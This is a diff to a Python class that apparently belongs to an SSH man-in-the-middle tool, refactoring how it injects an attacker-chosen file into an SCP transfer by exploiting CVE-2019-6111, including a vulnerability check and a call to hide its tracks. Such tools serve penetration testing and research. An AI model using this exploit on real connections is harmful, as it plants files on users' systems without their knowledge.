@@ -39,25 +39,17 @@ class SCPInjectFile(SCPForwarder):
         super().__init__(session)
         self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)
 
-        self.injectable = False
         self.inject_file_stat = os.stat(self.args.scp_inject_file)
         self.file_to_inject = None
 
     def process_data(self, traffic):
         if traffic == b'\x00':
-            self.injectable = True
             self.exploit()
         return traffic
 
-    def handle_traffic(self, traffic):
-        if not self.injectable:
-            return super(SCPInjectFile, self).handle_traffic(traffic)
-        else:
-            self.exploit()
-
     def exploit(self):
         def wait_ok():
-            assert self.session.scp_channel.recv(1024)
+            assert self.session.scp_channel.recv(1024) == b'\x00'
 
         def send_ok():
             self.session.scp_channel.sendall(b'\x00')
@@ -71,12 +63,11 @@ class SCPInjectFile(SCPForwarder):
             self.inject_file_stat.st_size,
             self.args.scp_inject_file.split('/')[-1]
         )
-        logging.info("Sending command %s", command)
+        logging.info("Sending command %s", command.strip())
         self.session.scp_channel.sendall(command)
         try:
             wait_ok()
         except AssertionError:
-            self.injectable = False
             logging.info("Client is not vulnerable to CVE-2019-6111")
             self.hide_tracks()
             return
